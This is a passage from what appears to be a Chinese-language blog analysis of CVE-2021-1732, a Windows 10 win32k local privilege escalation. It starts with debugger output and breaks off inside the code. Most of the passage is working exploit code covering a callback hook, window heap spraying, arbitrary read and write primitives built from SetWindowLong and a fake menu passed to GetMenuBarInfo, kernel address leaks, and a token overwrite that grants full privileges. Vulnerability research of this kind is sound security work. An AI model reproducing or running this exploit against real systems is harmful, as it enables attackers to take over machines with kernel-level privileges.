<p><img src="/2023/01/05/CVE-2021-1732%20Win10%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220809095500710.png"></p>
<p>rdi寄存器更新的数据就是ptagWND句柄的指针，tagWND地址fffffe52057bc640</p>
<h3 id="pEPROCESS"><a href="#pEPROCESS" class="headerlink" title="pEPROCESS"></a>pEPROCESS</h3><p>窗口句柄地址为fffffe52057bc640</p>
<p><img src="/2023/01/05/CVE-2021-1732%20Win10%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220809095519365.png"></p>
<p>偏移0x0是进程的Thread地址</p>
<p><img src="/2023/01/05/CVE-2021-1732%20Win10%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220809095528420.png"></p>
<pre class="line-numbers language-none"><code class="language-none">kd&gt; !dml_proc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/2023/01/05/CVE-2021-1732%20Win10%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220809095541004.png"></p>
<h3 id="Spmenu偏移"><a href="#Spmenu偏移" class="headerlink" title="Spmenu偏移"></a>Spmenu偏移</h3><p><img src="/2023/01/05/CVE-2021-1732%20Win10%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220809095550574.png"></p>
<p>赋值源码</p>
<pre class="line-numbers language-none"><code class="language-none">// 4. build fake menu's bar info
pFakeMenu[0] = (ULONG_PTR)&amp;ulFakeHandle;
pFakeMenu[5] = (ULONG_PTR)pFakeMenuBody;				// fake body
((PULONG)(&amp;pFakeMenuBody[5]))[1] = 0xffff;				// make items count to max
((PULONG)(&amp;pFakeMenu[8]))[0] = 1;						// make menu'x to 1
((PULONG)(&amp;pFakeMenu[8]))[1] = 1;						// make menu'y to 1
pFakeMenu[0xb] = (ULONG_PTR)pFakeItems;					// set fake menu's fake items
ulFakeRefCount[0] = (ULONG_PTR)pFakeMenu;
pFakeMenu[0x13] = (ULONG_PTR)&amp;ulFakeRefCount;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="桌面堆地址"><a href="#桌面堆地址" class="headerlink" title="桌面堆地址"></a>桌面堆地址</h3><p><img src="/2023/01/05/CVE-2021-1732%20Win10%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220809095609493.png"></p>
<h3 id="tagWNDK结构体"><a href="#tagWNDK结构体" class="headerlink" title="tagWNDK结构体"></a>tagWNDK结构体</h3><p>RECT结构体定义</p>
<pre class="line-numbers language-none"><code class="language-none">typedef struct tagRECT
{
	LONG left;
	LONG top;
	LONG right;
	LONG bottom;
}RECT, *PRECT, NEAR *NPRECT， FAR *LPRECT;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>测试源码</p>
<pre class="line-numbers language-none"><code class="language-none">##include &lt;windows.h&gt;
##include &lt;winuser.h&gt;
##include &lt;tlhelp32.h&gt;
##include &lt;iostream&gt;

##if 1
##define DEBUG_BREAK()       __debugbreak();
##else
##define DEBUG_BREAK()
##endif
##define WND_NAME    L"WND"
##define CLS_NAME    L"WND_CLS"
##define DefWindowProc  DefWindowProcW
using HMVALIDATEHANDLE = VOID * (WINAPI*)(HWND hwnd, int type);
HMVALIDATEHANDLE HMValidateHandle = NULL;

BOOL FindHMValidateHandle() {
    HMODULE hUser32 = LoadLibraryA("user32.dll");
    if (hUser32 == NULL) {
        printf("Failed to load user32");
        return FALSE;
    }
    BYTE* pIsMenu = (BYTE*)GetProcAddress(hUser32, "IsMenu");
    if (pIsMenu == NULL) {
        printf("Failed to find location of exported function 'IsMenu' within user32.dll\n");
        return FALSE;
    }
    unsigned int uiHMValidateHandleOffset = 0;
    for (unsigned int i = 0; i &lt; 0x1000; i++) {
        BYTE* test = pIsMenu + i;
        if (*test == 0xE8) {
            uiHMValidateHandleOffset = i + 1;
            break;
        }
    }
    if (uiHMValidateHandleOffset == 0) {
        printf("Failed to find offset of HMValidateHandle from location of 'IsMenu'\n");
        return FALSE;
    }

    unsigned int addr = *(unsigned int*)(pIsMenu + uiHMValidateHandleOffset);
    unsigned int offset = ((unsigned int)pIsMenu - (unsigned int)hUser32) + addr;

    HMValidateHandle = (HMVALIDATEHANDLE)((ULONG_PTR)hUser32 + offset + 11);
    return TRUE;
}
BOOL RegistWndClass(PCTSTR ClsName) {
    WNDCLASS wndclass = { 0 };

    wndclass.style = CS_HREDRAW | CS_VREDRAW;//窗口类型
    wndclass.lpfnWndProc = DefWindowProc; //定义窗口处理函数
    wndclass.cbClsExtra = 0;//窗口类扩展
    wndclass.cbWndExtra = 0x100;//窗口实例无扩展
    wndclass.hInstance = GetModuleHandle(NULL);;//当前实例句柄
    wndclass.hIcon = LoadIcon(NULL, IDI_APPLICATION);//窗口的最小化图标类型
    wndclass.hCursor = LoadCursor(NULL, IDC_ARROW);//窗口采用箭头光标
    wndclass.hbrBackground = (HBRUSH)GetStockObject(WHITE_BRUSH);//窗口背景色
    wndclass.lpszMenuName = NULL;//窗口菜单
    wndclass.lpszClassName = ClsName; //实际就是进程列表显示的名称

    return !!RegisterClass(&amp;wndclass);
}
HWND CreateWnd(PCTSTR ClsName) {
    HMENU hMenu = NULL;
    HMENU hHelpMenu = NULL;
    hMenu = CreateMenu();
    hHelpMenu = CreateMenu();

    AppendMenu(hHelpMenu, MF_STRING, 0x1888, TEXT("about"));
    //0x1888是这个子菜单的句柄
    AppendMenu(hMenu, MF_POPUP, (LONG)hHelpMenu, TEXT("help"));
    return CreateWindowEx(NULL, ClsName, WND_NAME, NULL, 0, 0, 0, 0, NULL, hMenu, GetModuleHandle(NULL), NULL);
}
int main()
{
    HWND         hwnd;
    PVOID pCurWndObj1 = NULL;

    FindHMValidateHandle();


    if (RegistWndClass(CLS_NAME)) //检查窗口是否注册成功
    {
        printf("RegisterClass successfull!\n");

        hwnd = CreateWnd(CLS_NAME);
        printf("hwnd == %X\n", hwnd);
        pCurWndObj1 = HMValidateHandle((HWND)hwnd, 0x1);
        printf("pCurWndObj1 == %llx\n", pCurWndObj1);
        SetWindowLong(hwnd, 0x1c, 0x40c00000);              
        RECT Rect = { 0 };
        GetWindowRect(hwnd, &amp;Rect);
        printf("left    == %llx\n", Rect.left);
        printf("top     == %llx\n", Rect.top);
        printf("right   == %llx\n", Rect.right);
        printf("bottom  == %llx\n", Rect.bottom);
        DEBUG_BREAK();
        getchar();
    }

}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>运行结果</p>
<p><img src="/2023/01/05/CVE-2021-1732%20Win10%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220809095623154.png"></p>
<p>tagWNDK从kernel映射到user的内存空间</p>
<p><img src="/2023/01/05/CVE-2021-1732%20Win10%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20220809095634587.png"></p>
<p>RECT结构体</p>
<pre class="line-numbers language-none"><code class="language-none">typedef struct tagRECT
{
	LONG left;    //0x58
	LONG top;     //0x50
	LONG right;   //0x68
	LONG bottom;  //0x60
}RECT;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="hook函数分析"><a href="#hook函数分析" class="headerlink" title="hook函数分析"></a>hook函数分析</h3><pre class="line-numbers language-none"><code class="language-none">##include &lt;HookLib.h&gt;
##pragma comment(lib, "Zydis.lib")
##pragma comment(lib, "HookLib.lib")
using USERMODECALLBACK = VOID(WINAPI*)( ULONG_PTR Para1, ULONG_PTR Para2, ULONG_PTR Para3, ULONG_PTR Para4 );
USERMODECALLBACK UserModeCallback_Orig = NULL;
SetHook((PVOID)(pUserModeCallbackTable[CALLBACK_INDEX]), UserModeCallback_Proxy, reinterpret_cast&lt;PVOID*&gt;(&amp;UserModeCallback_Orig));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>当程序在CreateWindowEx回调了UserModeCallbackTable表上的第123项_xxxClientAllocWindowClassExtraBytes，就会跳转到Hook函数UserModeCallback_Proxy赋值。</p>
<p>在调用CreateWindowEx创建窗口过程中需要hook user32!_xxxClientAllocWindowClassExtraBytes跳转到hook函数，hook函数内部调用NtCallbackReturn伪造回调内核态参数功能返回一个自定义的pExtraBytes,然后自定义的pExtraBytes会返回到win32kfull!xxxClientAllocWindowClassExtraBytes,将pExtraBytes当作返回值返回到xxxCreateWindowEx，赋值tagWND-&gt;pExtraBytes</p>
<pre class="line-numbers language-none"><code class="language-none">VOID WINAPI UserModeCallback_Proxy(ULONG_PTR Para1, ULONG_PTR Para2, ULONG_PTR Para3, ULONG_PTR Para4)
{
	ULONG_PTR ulConsoleInfo[0x2] = { 0 };//调用NtUserConsoleControl需要构造0x10长度的参数
	ULONG_PTR ulRetBuffer[0x3] = { 0 };//调用NtCallbackReturn需要构造0x18长度的参数
	ULONG ulCurWnd = (ULONG)SprayWndHandles[SPRAY_WND_COUNT / 2];
	ULONG_PTR ulWndObjOff = 0x0;

	printf("UserMode Callback: %llx %llx %llx %llx\n", Para1, Para2, Para3, Para4 );
	printf( "Current window is Handle %X\n",  ulCurWnd);

	// since it was freed and occupied again , so the index increase one, details see my blog's article!
	{
		USHORT usHigh = (ulCurWnd &gt;&gt; 0x10) &amp; 0xffff;
		USHORT usLow = ulCurWnd &amp; 0xffff;
		ulCurWnd = ((usHigh + 1) &lt;&lt; 0x10) | usLow;
		//ulCurWnd是通过sprayHandle拿到的即将创建的窗口句柄值
	}

	DEBUG_BREAK();

	ulWndObjOff = GetWndObjOffset(ulCurWnd);
	printf("Current Window Object relative to DesktopHeap's offset:%X\n", ulWndObjOff);
	
	// trigle to change flag 
	ulConsoleInfo[0] = ulCurWnd;
	NtUserConsoleControl(0x6, (PVOID)&amp;ulConsoleInfo, sizeof(ulConsoleInfo));
	//对tagWND-&gt;flag设置0x800属性
	ulRetBuffer[0] = ulWndObjOff;
	NtCallbackReturn(&amp;ulRetBuffer, sizeof(ulRetBuffer), 0x0);
	// hook: call origin function, in this case, don't need, due to USER32!_xxxClientAllocWindowClassExtraBytes's internal call NtCallbackReturn
	//UserModeCallback_Orig(Para1, Para2, Para3, Para4);
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="SprayHandler"><a href="#SprayHandler" class="headerlink" title="SprayHandler"></a>SprayHandler</h3><p>创建大量窗口堆后销毁尽量靠中的窗口，再创建一个窗口桌面堆会优先使用休闲的空间，由于之前创建的窗口挤压了堆空间，可以大概率获得原来销毁的窗口，根据窗口句柄生成的规律预知构造一个即将创建的窗口的句柄表示我们现在创建的窗口。</p>
<p><strong>利用SprayHandle的条件：</strong></p>
<p>1.创建足够多的窗口压缩堆空间，在下次调用的时候优先调用之前使用过的休闲空间。</p>
<p>2.对窗口句柄进行规律构造，生成即将生成的窗口句柄，在尚未创建窗口前就使用某写只要调用句柄的API</p>
<pre class="line-numbers language-none"><code class="language-none">if (RegistWndClass(CLS_NAME) ) {
	for (int i = 0; i &lt; SPRAY_WND_COUNT; i++) {
		SprayWndHandles[i] = CreateWnd(CLS_NAME);
	}
	//挤压分配堆空间
	printf("SprayWndHandles[%x] == %X \n", SPRAY_WND_COUNT / 2, SprayWndHandles[SPRAY_WND_COUNT / 2]);
	DestroyWindow(SprayWndHandles[SPRAY_WND_COUNT/2]);//摧毁靠中的窗口，释放这个窗口下属的堆块
	SetHook((PVOID)(pUserModeCallbackTable[CALLBACK_INDEX]), UserModeCallback_Proxy, reinterpret_cast&lt;PVOID*&gt;(&amp;UserModeCallback_Orig));
	//创建一个新窗口触发Hook载入flag 0x800属性
	HWND hTargetWnd = CreateWnd(CLS_NAME);
	printf("hTargetWnd == %X\n", hTargetWnd);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>释放的堆块是大范围正在利用堆中的唯一空闲堆，所以知道分配的规律就能继续利用这个堆块。</p>
<pre class="line-numbers language-none"><code class="language-none">	{
		USHORT usHigh = (ulCurWnd &gt;&gt; 0x10) &amp; 0xffff;
		USHORT usLow = ulCurWnd &amp; 0xffff;
		ulCurWnd = ((usHigh + 1) &lt;&lt; 0x10) | usLow;
		//ulCurWnd是通过sprayHandle拿到的即将创建的窗口句柄值
	}
HWND CreateWnd( PCTSTR ClsName ) {
	return CreateWindowEx(NULL, ClsName, WND_NAME, NULL, 0, 0, 0, 0, NULL, NULL, GetModuleHandle(NULL), NULL);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="HMVaildateHandle获取hwnd句柄地址"><a href="#HMVaildateHandle获取hwnd句柄地址" class="headerlink" title="HMVaildateHandle获取hwnd句柄地址"></a>HMVaildateHandle获取hwnd句柄地址</h3><p>HMAllocObject创建了桌面堆类型句柄后，会把tagWND对象放入到内核模式到用户模式内存映射的地址里，为了验证句柄的有效性，窗口管理器会调用User32!HMVaildateHandle函数读取这个表，将函数句柄和句柄类型作为参数，并在句柄中查找对应的向，查找到对象返回tagWND只读映射的对象指针，通过tagWND这个对象获取到句柄和窗口信息。使用IsMenu第一个call定位函数</p>
<pre class="line-numbers language-none"><code class="language-none">using HMVALIDATEHANDLE = VOID* (WINAPI*)(HWND hwnd, int type);
HMVALIDATEHANDLE HMValidateHandle = NULL;
//定义HMVALIDATEHANDLE类型结构体装在HMValidateHandle函数
BOOL FindHMValidateHandle() {//找到HMValidateHandle
	HMODULE hUser32 = LoadLibraryA("user32.dll");
	if (hUser32 == NULL) {
		printf("Failed to load user32");
		return FALSE;
	}
	BYTE* pIsMenu = (BYTE*)GetProcAddress(hUser32, "IsMenu");
	if (pIsMenu == NULL) {
		printf("Failed to find location of exported function 'IsMenu' within user32.dll\n");
		return FALSE;
	}
	unsigned int uiHMValidateHandleOffset = 0;
	for (unsigned int i = 0; i &lt; 0x1000; i++) {
		BYTE* test = pIsMenu + i;
		if (*test == 0xE8) {
			uiHMValidateHandleOffset = i + 1;
			break;
		}
	}
	if (uiHMValidateHandleOffset == 0) {
		printf("Failed to find offset of HMValidateHandle from location of 'IsMenu'\n");
		return FALSE;
	}

	unsigned int addr = *(unsigned int*)(pIsMenu + uiHMValidateHandleOffset);
	unsigned int offset = ((unsigned int)pIsMenu - (unsigned int)hUser32) + addr;

	HMValidateHandle = (HMVALIDATEHANDLE)((ULONG_PTR)hUser32 + offset + 11);//找HMValidateHandle基址
	return TRUE;
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>利用HMVaildateHandle寻找hwnd句柄地址</p>
<pre class="line-numbers language-none"><code class="language-none">pCurWndObj = HMValidateHandle((HWND)hwnd, 0x1);	<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<h3 id="tagWND与桌面堆基址偏移计算"><a href="#tagWND与桌面堆基址偏移计算" class="headerlink" title="tagWND与桌面堆基址偏移计算"></a>tagWND与桌面堆基址偏移计算</h3><pre class="line-numbers language-none"><code class="language-none">ULONG GetWndObjOffset(ULONG_PTR hwnd ) {
	PVOID pCurWndObj = NULL;
	ULONG_PTR ulWndObjOff = 0x0;
	ULONG_PTR ulTebAddr = 0;

	ulTebAddr = __readgsqword(0x30);//获取teb基址

	pCurWndObj = HMValidateHandle((HWND)hwnd, 0x1);					//利用HMValidateHandle寻找句柄地址，桌面窗口固定参数是0x1
	ulWndObjOff = (ULONG_PTR)pCurWndObj - *(ULONG_PTR*)(ulTebAddr + TEB_DESKTOPHEAP_OFF);//窗口tagWND相对用户层桌面堆地址偏移
	return ulWndObjOff;//返回窗口hTargetWnd与进程用户堆基址偏移
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>得到tagWND与用户进程桌面堆地址偏移后，就知道内核层窗口tagWND地址</p>
<h3 id="Write-Primitive"><a href="#Write-Primitive" class="headerlink" title="Write Primitive"></a>Write Primitive</h3><p>SetWindowLongPtr:任意地址写入</p>
<p>SetWindowLong:任意地址写入</p>
<p>NtCallbackReturn:自定义offset(pExtraBytes)</p>
<p>NtUserConsoleControl:设置flag</p>
<p>在flag | 0x800 + 载入的自定义pExtraBytes下调用SetWindowLong/SetWindowLongStr,可以进行任意地址写入。</p>
<p>写入的长度有cbWndExtra长度限制，需要先设置足够大的cbWndExtra</p>
<pre class="line-numbers language-none"><code class="language-none">SetWindowLongPtr(hTargetWnd, TAGWND_BODY_EXTRA_SIZE_OFF, (ULONG_PTR)-1);//修改cbWNDExtra
SetWindowLong(hAdjacentWnd, 0x498 + 0x30, 0x7);//hAdjacentWnd窗口中的pExtraBytes作为offset自定义写入<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h3 id="Read-Primitive"><a href="#Read-Primitive" class="headerlink" title="Read Primitive"></a>Read Primitive</h3><p>使用写原语将自定义的用户层spmenu载入内核层tagWND-&gt;spmenu,使用GetMenuBarInfo读取。通过GetMenuBarInfo信息泄露指定地址数据。</p>
<pre class="line-numbers language-none"><code class="language-none">ULONG_PTR ReadPrimitive( HWND TargetWnd ) {
	MENUBARINFO menuBarInfo;
	ULONG_PTR ulValue0, ulValue1;

	menuBarInfo.cbSize = sizeof(menuBarInfo);//menuBarInfo初始化
	GetMenuBarInfo(TargetWnd, OBJID_MENU, 0x1, &amp;menuBarInfo);

	ReBuildData(&amp;menuBarInfo, &amp;ulValue0, &amp;ulValue1);
	//将调用GetMenuBarInfo返回的menuBarInfo中的4字节RECT.left和4字节RECT.top
	return ulValue0;
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>将从泄露的2个32位地址的RECT.left和RECT.right重构64位地址</p>
<pre class="line-numbers language-none"><code class="language-none">VOID ReBuildData( PMENUBARINFO MenuBarInfoPtr, ULONG_PTR* RetValue0, ULONG_PTR* RetValue1 ) {
	ULONG_PTR ulValue0 = MAKE_64BIT_VALUE((ULONG)(MenuBarInfoPtr-&gt;rcBar.top), (ULONG)(MenuBarInfoPtr-&gt;rcBar.left));
	*RetValue0 = ulValue0;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><strong>menuBarInfo结构体</strong></p>
<pre class="line-numbers language-none"><code class="language-none">typedef struct tagMENUBARINFO
{
    DWORD cbSize;
    RECT rcBar;          // rect of bar, popup, item    &lt;===这个就是泄露地址的结构体成员
    HMENU hMenu;         // real menu handle of bar, popup
    HWND hwndMenu;       // hwnd of item submenu if one
    BOOL fBarFocused:1;  // bar, popup has the focus
    BOOL fFocused:1;     // item has the focus
    BOOL fUnused:30;     // reserved
} MENUBARINFO, *PMENUBARINFO, *LPMENUBARINFO;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">ULONG_PTR GetCurThreadObjAddr() {
   HANDLE hThread = INVALID_HANDLE_VALUE;
   ULONG_PTR ulAddr = 0x0;
   hThread = OpenThread(THREAD_QUERY_INFORMATION, FALSE, GetCurrentThreadId());
   if (hThread != INVALID_HANDLE_VALUE){
      ulAddr = (ULONG_PTR)GetTargetHandleObject(GetCurrentProcessId(), (ULONG_PTR)hThread);
      CloseHandle(hThread);
      return ulAddr;
   }
   return 0;
}
//==========================================================================
{
ULONG_PTR ulDesktopHeapBase = 0x0;
ULONG_PTR ulFakeHandle = 0xFFFF;
ULONG_PTR ulFakeRefCount[2] = { 0 };
PULONG_PTR pFakeMenu = NULL;
PULONG_PTR pFakeMenuBody = NULL;
PULONG_PTR pFakeItems = NULL;
PVOID pCurWndObj1 = NULL;

SetWindowLong(hTargetWnd, TAGWND_BODY_STYLE_OFF, 0x40c00000); 
//将自定义的spmenu载入到tagWND-&gt;spmenu要调用SetWindowLongPtr中的xxxSetWindowData
//而调用xxxSetWindowData，需要tagWNDk-&gt;style包含WPCCHILD

pFakeMenu = (PULONG_PTR)VirtualAlloc(NULL, 0x100, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
pFakeMenuBody = (PULONG_PTR)VirtualAlloc(NULL, 0x100, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
pFakeItems = (PULONG_PTR)VirtualAlloc(NULL, 0x100, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
//给各个自定义结构申请内存

SetWindowLongPtr(hTargetWnd, GWLP_ID, (LONG_PTR)pFakeMenu); 
//当参数2为WS_CHILD时，我们才可以调用SetWindowLongPtr将参数3指定的地址(pFakeMenu)写入到tagWND-&gt;spmenu



SetWindowLong(hTargetWnd, TAGWND_BODY_STYLE_OFF, 0x04c00000); 
// 载入spmenu后就style就不需要为0x40c00000了，style需要恢复原数据

// 构造符合正常执行GetMenuBarInfo且把pFakeItems当作读取地址的spmenu
pFakeMenu[0] = (ULONG_PTR)&amp;ulFakeHandle;
pFakeMenu[5] = (ULONG_PTR)pFakeMenuBody;                // fake body
((PULONG)(&amp;pFakeMenuBody[5]))[1] = 0xffff;              // make items count to max
((PULONG)(&amp;pFakeMenu[8]))[0] = 1;                       // make menu'x to 1，这是构造正常的spmenu必须的参数
((PULONG)(&amp;pFakeMenu[8]))[1] = 1;                       // make menu'y to 1，这是构造正常的spmenu必须的参数
pFakeMenu[0xb] = (ULONG_PTR)pFakeItems;                 // 这个就是读取的地址（详情看GetMenuBarInfo分析）
ulFakeRefCount[0] = (ULONG_PTR)pFakeMenu;
pFakeMenu[0x13] = (ULONG_PTR)&amp;ulFakeRefCount;

//开始一步一步根据内核结构联系拿到内核桌面堆地址
{
    ULONG_PTR ulAddr = 0; 
    ULONG_PTR ulValue = 0;

    ulAddr = GetCurThreadObjAddr();
    if (!ulAddr)
        return -1;

    pFakeItems[0] = (ULONG_PTR)(ulAddr + ETHREAD_WIN32THREAD_OFF - 0x40);   // 泄露地址-0x40
    ulValue = 0;
    ulValue = ReadPrimitive(hTargetWnd);

    pFakeItems[0] = (ULONG_PTR)(ulValue - 0x40);            
    ulValue = 0;
    ulValue = ReadPrimitive(hTargetWnd);

    pFakeItems[0] = (ULONG_PTR)(ulValue + WIN32THREAD_DESKTOP_OFF - 0x40);
    ulValue = 0;
    ulValue = 0;
    ulValue = ReadPrimitive(hTargetWnd);

    pFakeItems[0] = (ULONG_PTR)(ulValue + DESKTOP_HEAPBASE_OFF - 0x40);
    ulValue = 0;
    ulValue = ReadPrimitive(hTargetWnd);

    ulDesktopHeapBase = ulValue;    //内核桌面堆地址
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>spmenu是通过分析GetMenuBarInfo得到的与正常spmenu结构有差异的自定义spmenu，pFakeItems是需要泄露的指针，只要自定义pFakeItems，就可以将根读取到内核桌面堆地址。</p>
<h3 id="寻找相邻窗口"><a href="#寻找相邻窗口" class="headerlink" title="寻找相邻窗口"></a>寻找相邻窗口</h3><pre class="line-numbers language-none"><code class="language-none">//找相邻端口
for (ULONG ulIndex = 0x0; ulIndex &lt; 0x30; ulIndex += 8) {
pFakeItems[0] = (ULONG_PTR)(ulDesktopHeapBase + ulWndOffset + ulTagWndBodySize + ulIndex - 0x40);
//两个相邻的窗口地址差是一个tagWNDK结构体大小，循环计数来偏差定位
ulValue = 0;
ulValue = ReadPrimitive(hTargetWnd);
//tagWNDK首地址内容是相邻窗口句柄值
if (ulValue == (ULONG_PTR)hAdjacentWnd) {
bAdjacent = TRUE;
ulTagWndBodySize += ulIndex;
break;
}
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ulDesktopHeapBase + ulWndOffset表示目标窗口在内核层的地址</p>
<p>目标窗口已经将tagWND空间偏移设置为pExtraBytes,在相邻窗口可以配置进程Token空间偏移作为pExtraBytes对进程Token空间进行读写。</p>
<h3 id="使用DataOnlyAttack进行提权"><a href="#使用DataOnlyAttack进行提权" class="headerlink" title="使用DataOnlyAttack进行提权"></a>使用DataOnlyAttack进行提权</h3><p>win10 1708之后，不仅需要修改当前进程特权，还需要调整当前token中的UserAndGroups和管理员相同，才能发生提权。</p>
<pre class="line-numbers language-none"><code class="language-none">ULONG_PTR GetCurTokenObjAddr() {    //获取进程的Token地址
    HANDLE hProc; //进程句柄
    HANDLE hToken; //进程的令牌句柄
    PVOID pTokenObj;

    hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, GetCurrentProcessId());

    OpenProcessToken(
        hProc,
        TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY,
        &amp;hToken);
    pTokenObj = GetTargetHandleObject(GetCurrentProcessId(), (ULONG_PTR)hToken);
    return (ULONG_PTR)pTokenObj;
    //返回Token地址 
}

if (bAdjacent) {
        // read adjacent hwnd's flag
        pFakeItems[0] = (ULONG_PTR)(ulDesktopHeapBase + ulWndOffset + ulTagWndBodySize + TAGWND_BODY_REL_FLAG_OFF - 0x40);  //这里是查看相邻窗口tagWNDk的flag的值
        ulValue = 0;
        ulValue = ReadPrimitive(hTargetWnd);

        ulTokenObjAddr = GetCurTokenObjAddr();//进程的Token地址

        SetWindowLongPtr(hTargetWnd, TAGWND_BODY_EXTRA_SIZE_OFF, (ULONG_PTR)-1); //将cbWndExtra修改到最高
        SetWindowLongPtr(hTargetWnd, ulTagWndBodySize + TAGWND_BODY_REL_FLAG_OFF, ulValue | 0x800); //配置相邻窗口的flag值存在0x800属性
        //配置相邻窗口的flag存在0x800属性
        SetWindowLongPtr(hTargetWnd, ulTagWndBodySize + TAGWND_BODY_REL_VALUE_OFF, ulTokenObjAddr - ulDesktopHeapBase); //将进程token地址-内核桌面堆地址的偏移量放到相邻窗口的pExtraBytes
        //配置相邻窗口的pExtraBytes为
        SetWindowLongPtr(hTargetWnd, ulTagWndBodySize + TAGWND_BODY_EXTRA_SIZE_OFF, (ULONG_PTR)-1); //将相邻窗口的cbWndExtra修改到最高
        //配置相邻窗口的cbWndExtra

        // adjacent wnd can modify token's anything
        SetWindowLongPtr(hAdjacentWnd, 0x40, (ULONG_PTR)-1);
        SetWindowLongPtr(hAdjacentWnd, 0x48, (ULONG_PTR)-1);

        SetWindowLong(hAdjacentWnd, 0x498 + 0x30, 0x7);
        SetWindowLong(hAdjacentWnd, 0x498 + 0x40, 0xf);
        DEBUG_BREAK();

        // Restore adjacent window
        pFakeItems[0] = (ULONG_PTR)(ulDesktopHeapBase + ulWndOffset + ulTagWndBodySize + TAGWND_BODY_REL_FLAG_OFF - 0x40);
        ulValue = 0;
        ulValue = ReadPrimitive(hTargetWnd);
        SetWindowLongPtr(hTargetWnd, ulTagWndBodySize + TAGWND_BODY_REL_FLAG_OFF, ulValue &amp; ~0x800);        //删除相邻窗口的flag的0x800属性
        SetWindowLongPtr(hTargetWnd, ulTagWndBodySize + TAGWND_BODY_REL_VALUE_OFF, 0);
